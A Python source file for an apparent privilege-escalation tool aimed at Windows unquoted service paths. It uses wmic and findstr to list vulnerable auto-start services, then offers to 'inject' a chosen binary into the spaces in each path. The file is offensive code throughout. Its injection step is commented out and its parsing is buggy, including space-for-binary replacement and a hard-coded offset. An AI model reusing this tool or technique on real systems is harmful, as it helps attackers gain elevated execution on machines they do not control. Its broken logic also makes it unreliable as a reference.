import subprocess
import re
import os
import argparse

"""
Prints cool header for tool
"""
def header():
    pass #stubbed out for now

"""
Method parses commandline arguments
"""
def parseArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument('-b', "-B", help="enter -b followed by binary (make sure it's one letter) ",type=str)
    args = parser.parse_args()
    if args.b is not None:
        return args.b
    else: #if user did not enter a commandline argument
        raise Exception("No argument supplied")
"""
Method that injects binary/binaries into spaces in vulnerable path
"""
def inject_binary(vuln_files,binary):
    for key in vuln_files:
        print('Vulnerable file: ',key)
        answer = input('Would you like to inject binary into this file? (y/n)')
        if answer == 'y' or answer == 'Y' or answer == 'yes':
            marker_list = vuln_files.get(key)
            try:
                new_path = key.replace(' ',binary) #replace all spaces in file with binary
                print('new path is: ',new_path)
                #os.rename(key,new_path)
            except:
                print('Could not inject binary into file: ',key)
                continue

"""
Method gets files that are vulnerable and stores them in dict
@return vuln_files dict mapping file path to list of markers that are where spaces are
"""
def lookforSpaces():
    #command needed to get vulnerable files
    command = "wmic service get name,displayname,pathname,startmode |findstr /i " \
              + '"Auto"' + " |findstr /i /v " + '"C:\Windows\\\\"' + " |findstr /i /v " + '"""'
    output = subprocess.getoutput(command) #save output of command for further use
    responses = output.strip().splitlines()
    response_to_marker = dict()
    file_path_to_marker = dict()
    vuln_files = dict()
    for resp in responses: #iterate through responses
        if len(resp) != 0:
           marker = 0
           for char in resp: #iterate through chars
               try:
                    if char == 'C' and resp[marker+1] == ':' and resp[marker+2]  == '\\':
                        #almost everything starts with C:\\
                        response_to_marker.update({resp:marker})
                        break
                    else:
                        marker+=1
               except IndexError: #if error occurs just continue
                   continue
    for key in response_to_marker.keys(): #iterate through keys which is response
        for i in range(127,len(key)): #can start at 127 since C starts there
            try:
                if key[i] == ' ' and key[i+1] == ' ' \
                   and re.match('[a-zA-Z]',key[i-1]):
                       #check if you are at end of file path if current char is space
                       #and previous char is letter and next char is space
                       file_path_to_marker.update({key:[response_to_marker.get(key),i]}) #update dict
                       break
            except IndexError:
                  continue
    for key in file_path_to_marker:
        start = file_path_to_marker.get(key)[0]
        end = file_path_to_marker.get(key)[1]
        marker_list = []
        file_path = key[start:end] #slice string only caring about start:end as that is file path
        for i in range(len(file_path)):
            if file_path[i] == ' ': #appending all spaces in file path
                marker_list.append(i)
            elif i == (end-start-1): #if you have reached end of for loop update dict so we only have to update it once
                 vuln_files.update({file_path:marker_list})
    return vuln_files #just return set of vuln file paths ditch marker

"""
Main method that handles logic
"""
def main():
    header()
    binary = parseArgs()
    vuln_files = lookforSpaces()
    inject_binary(vuln_files,binary)

if __name__ == '__main__':
    main()
